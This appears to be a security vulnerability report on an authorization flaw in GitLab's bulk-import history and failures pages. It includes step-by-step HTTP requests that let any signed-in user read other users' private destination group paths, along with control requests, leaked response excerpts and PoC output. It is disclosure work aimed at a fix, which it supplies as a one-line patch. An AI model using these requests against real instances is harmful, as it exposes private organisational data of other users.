### Summary

The `Import::BulkImportsController#history` and `#failures` actions load the `BulkImport` record with `BulkImport.find(params[:id])` (a global lookup) instead of `current_user.bulk_imports.find(params[:id])`. The only authentication gate on the controller is `ApplicationController#authenticate_user!`; there is no per-record authorization check. As a result, any authenticated GitLab user can iterate over numeric `BulkImport` IDs and read other users' bulk-import destination paths (including private/internal groups that the requesting user has no membership in).

Sibling actions on the same controller (`#show`, `#realtime_changes`) load via `current_user.bulk_imports` and return 404 for non-owners. The fault is specific to `:history` and `:failures`.

This contradicts the documented intent, which GitLab states in issue [#455352](https://gitlab.com/gitlab-org/gitlab/-/issues/455352): *"Only the user who performed the import can view the history. Other users, including instance admins, see a 'Request failed with status code 404' error."* That issue is still an open feature request to *expand* access to instance admins. it has not been merged, and even if it were, expansion to admins is not the same as exposure to arbitrary authenticated users.

Affected file: `app/controllers/import/bulk_imports_controller.rb:88-93`
Affected routes (`config/routes/import.rb:79-84`):

- `GET /import/bulk_imports/:id/history`
- `GET /import/bulk_imports/:id/history/:entity_id/failures`


### Steps to reproduce

Two ordinary user accounts are required. In the assessment instance these were provisioned as `bob` (id 5, victim) and `alice` (id 6, attacker). The attacker only needs a normal, non-admin authenticated session.

1. Sign in as bob.
2. Enable Group/project bulk imports (Admin Area → Settings → General → Visibility & access controls → *Bulk import* on, OR `application_settings.bulk_import_enabled = true` via Rails console). This is the standard switch any operator with bulk-import enabled has set.
3. Bob creates a destination top-level group, e.g. `bob-dest-group`, with visibility set to **Private**.
4. Bob creates a Personal Access Token with `api` scope, and issues a bulk-import request (any source group will do; the import does not need to succeed the BulkImport record is created up-front):

   ```bash
   curl -X POST 'https://target.example.com/api/v4/bulk_imports' \
     -H "PRIVATE-TOKEN: <bob_pat>" \
     -H 'Content-Type: application/json' \
     -d '{
       "configuration": {
         "url": "https://gitlab.example.com",
         "access_token": "<bob_pat_for_source>"
       },
       "entities": [{
         "source_type": "group_entity",
         "source_full_path": "any-source-group",
         "destination_slug": "imported",
         "destination_namespace": "bob-dest-group"
       }]
     }'
   ```

   Note the returned `id` (BulkImport id) and entity `id`. In our reproduction these are `BulkImport.id = 1` and `entity.id = 1`.

**Exploit** (attacker actions, no admin rights required):

5. Sign in as alice (any plain authenticated user; alice is **not** a member of `bob-dest-group` and has no inherited access to it).

6. Issue the IDOR request with alice's `_gitlab_session` cookie:

   ```http
   GET /import/bulk_imports/1/history/1/failures HTTP/1.1
   Host: target.example.com
   Cookie: _gitlab_session=<alice_session>
   ```

7. Observe HTTP 200 with bob's destination path leaked in the response body (see *Relevant logs* below).

8. (Sibling action, also affected.) Issue:

   ```http
   GET /import/bulk_imports/1/history HTTP/1.1
   Cookie: _gitlab_session=<alice_session>
   ```

   Also returns 200 with bob's data.

**Controls that confirm the absence of an authz check, not a coincidence:**

- `GET /import/bulk_imports/999/history/999/failures` → **HTTP 404** (proves the 200 in step 7 is conditional on the BulkImport record existing not on alice's permissions).
- `GET /bob-dest-group` as alice → **HTTP 404** (proves alice has no normal access path to the leaked group; the disclosure is exclusive to the BulkImports controller).
- `GET /import/bulk_imports/1` (the `:show` action) as alice → **HTTP 404** (proves the same controller's other actions are correctly scoped via `current_user.bulk_imports`; only `:history` and `:failures` are affected).

A standalone PoC script that performs steps 5–8 and asserts PASS/FAIL is attached (`poc.py` in this submission); the canonical version is preserved in the finding record `0b29b71a49d0df2a` of the assessment workspace.

### What is the current *bug* behavior?

```
attacker (alice, non-member, non-admin) →
  GET /import/bulk_imports/1/history/1/failures →
  HTTP 200 OK, body contains bob's private group's destination path
```

The controller's `before_action :bulk_import` does `@bulk_import = BulkImport.find(params[:id])`, with no ownership/authorization predicate. `authenticate_user!` is the only gate, so any signed-in account passes.

### What is the expected *correct* behavior?

```
attacker (alice, non-member, non-admin) →
  GET /import/bulk_imports/1/history/1/failures →
  HTTP 404 Not Found
```

Matching the documented behavior in [#455352](https://gitlab.com/gitlab-org/gitlab/-/issues/455352) and matching the existing scoping of `:show` and `:realtime_changes` on the same controller.

**Suggested patch**: replace `BulkImport.find(params[:id])` in the `bulk_import` `before_action` with `current_user.bulk_imports.find(params[:id])`. This is the same one-line pattern used elsewhere in the controller for `:show` and `:realtime_changes`. ActiveRecord will raise `ActiveRecord::RecordNotFound` for non-owners and Rails will render the existing 404 page, preserving the indistinguishability between "does not exist" and "exists but is not yours" that GitLab uses elsewhere.

### Relevant logs and/or screenshots

Successful exploit (alice's session, bob's BulkImport id=1):

```http
GET /import/bulk_imports/1/history/1/failures HTTP/1.1
Host: target.example.com
Cookie: _gitlab_session=<redacted_alice_session>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 25093

<!DOCTYPE html>
<html>
  <head>
    <title>Failures for bob-dest-group/imported · GitLab</title>
    ...
  </head>
  <body>
    ...
    <div class="js-bulk-import-details"
         data-entity-id="1"
         data-full-path="bob-dest-group/imported"
         data-id="1">
    </div>
    ...
  </body>
</html>
```

Positive control BulkImport that does not exist (still alice's session):

```http
GET /import/bulk_imports/999/history/999/failures HTTP/1.1
Cookie: _gitlab_session=<redacted_alice_session>

HTTP/1.1 404 Not Found
```

This 200-vs-404 differential proves the controller is doing record-existence-only and not ownership.

Negative control alice's permission on bob's group via the normal path:

```http
GET /bob-dest-group HTTP/1.1
Cookie: _gitlab_session=<redacted_alice_session>

HTTP/1.1 404 Not Found
```

Same controller's correctly-scoped action, for comparison:

```http
GET /import/bulk_imports/1 HTTP/1.1
Cookie: _gitlab_session=<redacted_alice_session>

HTTP/1.1 404 Not Found
```

Standalone reproducer (`poc.py`, attached) prints:

```
[poc] GET .../import/bulk_imports/1/history/1/failures -> HTTP 200 (25093 bytes)
[poc] <title>: Failures for bob-dest-group/imported · GitLab
[poc] data-full-path: bob-dest-group/imported
[poc] sanity GET /bob-dest-group as alice -> HTTP 404 (expect 302/404: alice has NO access to bob's group)
PASS: Alice (non-member) read Bob's destination path 'bob-dest-group/imported' via /import/bulk_imports/:id/history/:entity_id/failures
```
#### Results of GitLab environment info

Tested on a self-hosted **GitLab Enterprise Edition 19.0.1-ee** instance (revision `52e5d1bf910`, post 2026-05-26 security release). No related CVE/advisory exists for these actions in 19.0.1's security release notes.

## Impact

Cross-tenant information disclosure to any authenticated user.

Concretely, an attacker with a free user account on a GitLab instance (or any low-privilege user on a self-hosted EE instance) can:

- Enumerate `BulkImport` IDs (small monotonic integers) and read the **destination namespace and destination slug** chosen by every user who has ever started a bulk import on the instance including imports targeting private/internal groups the attacker has no membership in.
- Read entity-level import metadata exposed on the failures view (`data-entity-id`, `data-full-path`, `data-id` in the mount element; `<title>Failures for <full-path></title>`).
- On instances where private/internal group names themselves are considered sensitive (common in enterprise self-hosted GitLab group names frequently encode customer names, project codenames, M&A targets, internal team structure), the leaked `destination_full_path` is the sensitive data.

The deviation from GitLab's own documented behavior is what gives this finding its severity floor: the intended state per [#455352](https://gitlab.com/gitlab-org/gitlab/-/issues/455352) is that even **instance admins** cannot see another user's bulk import history without owning it. The actual state is that **arbitrary authenticated users** can.
